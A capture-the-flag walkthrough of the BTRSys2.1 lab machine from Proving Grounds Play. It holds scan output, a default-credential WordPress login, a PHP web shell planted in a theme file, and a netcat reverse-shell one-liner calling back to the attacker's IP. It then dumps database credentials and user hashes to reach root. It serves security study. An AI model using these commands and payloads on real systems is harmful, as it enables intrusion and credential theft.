---
layout: default
title: BTRSys2.1
parent: Proving Grounds Play
nav_order: 4
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.242.50
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 10:27 EST
Nmap scan report for 192.168.242.50
Host is up (0.060s latency).
Not shown: 65379 closed tcp ports (reset), 153 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

# Enumeration

---

## 21 | FTP

Anonymous Logon allowed.

No files located and unable to upload.

## 80 | HTTP

### Gobuster scan

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ gobuster dir -u http://192.168.242.50 -w /usr/share/wordlists/custom/large_combined.txt -x aspx,php,
txt,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.242.50
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_combined.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/11/14 10:30:25 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 293]
/upload               (Status: 301) [Size: 317] [--> http://192.168.242.50/upload/]
/wordpress            (Status: 301) [Size: 320] [--> http://192.168.242.50/wordpress/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.242.50/javascript/]
/robots.txt           (Status: 200) [Size: 1451]
/server-status        (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 298]
/.htaccess.txt        (Status: 403) [Size: 302]
/.htaccess.conf       (Status: 403) [Size: 303]
/.htaccess.aspx       (Status: 403) [Size: 303]
/.htaccess.php        (Status: 403) [Size: 302]
/.htpasswd            (Status: 403) [Size: 298]
/.htpasswd.aspx       (Status: 403) [Size: 303]
/.htpasswd.conf       (Status: 403) [Size: 303]
/.htpasswd.txt        (Status: 403) [Size: 302]
/.htpasswd.php        (Status: 403) [Size: 302]
/LICENSE              (Status: 200) [Size: 1672]
Progress: 1132503 / 1132570 (99.99%)
```

_/robots.txt_

![robots](../../../assets/images/ctfs/proving_grounds/btrsys/robots.png)

_/upload_

![lepton](../../../assets/images/ctfs/proving_grounds/btrsys/lepton.png)

Attempted _admin:admin_ on the _/wordpress/wp-admin_ login and logged in.

![admin](../../../assets/images/ctfs/proving_grounds/btrsys/admin.png)

The _Twentyfourteen_ theme is available to exploit.

![twenty](../../../assets/images/ctfs/proving_grounds/btrsys/twenty.png)

# Exploitation

---

## Exploit Wordpress Theme

Place the following in the \*404.php\_ file.

```bash
<?php echo system($_REQUEST["cmd"]); ?>
```

![404](../../../assets/images/ctfs/proving_grounds/btrsys/404.png)

Verify that the PHP web shell is executing commands.

![cmd](../../../assets/images/ctfs/proving_grounds/btrsys/cmd.png)

Use _revshellgen_ to execute a reverse shell one-liner via the PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Execute the URL encoded payload in the PHP web shell and receive a reverse shell in our netcat listener.

```bash
URL: http://192.168.242.50/wordpress/wp-content/themes/twentyfourteen/404.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.50] 51742
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Post-Exploitation

---

## Enumerate Wordpress Settings

Locate MySQL credentials in _/var/www/html/wordpress/wp-config.php_

```bash
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

```

## Enumerate MySQL Databases

Authenticate to MySQL service with _root_ user.

```bash
www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -prootpassword!
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 136
Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
| phpmyadmin         |
| sys                |
| wordpress          |
+--------------------+
7 rows in set (0.06 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed


mysql> select * from wp_users;
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |
|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |
+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
2 rows in set (0.00 sec)
```

## Identify the Hash

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/infosecprep]
└─$ nth --file hash.txt

  _   _                           _____ _           _          _   _           _
 | \ | |                         |_   _| |         | |        | | | |         | |
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash


a318e4507e5a74604aafb45e4741edd3

Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  Tiger-128,  Skein-256(128),
Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 md5(md5(md5($pass))), HC: 3500 Summary:
Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))), HC: 4300
md5(sha1($pass)), HC: 4400  md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33
md5(md4($pass)), JtR: dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, JtR: md2
Snefru-128, JtR: snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,
BigCrypt, JtR: bigcrypt


```

![cracked](../../../assets/images/ctfs/proving_grounds/btrsys/cracked.png)

```bash
# Switch user with the cracked password 'roottoor'
www-data@ubuntu:/var/www/html/wordpress$ su root
Password:
root@ubuntu:/var/www/html/wordpress# id
uid=0(root) gid=0(root) groups=0(root)

```
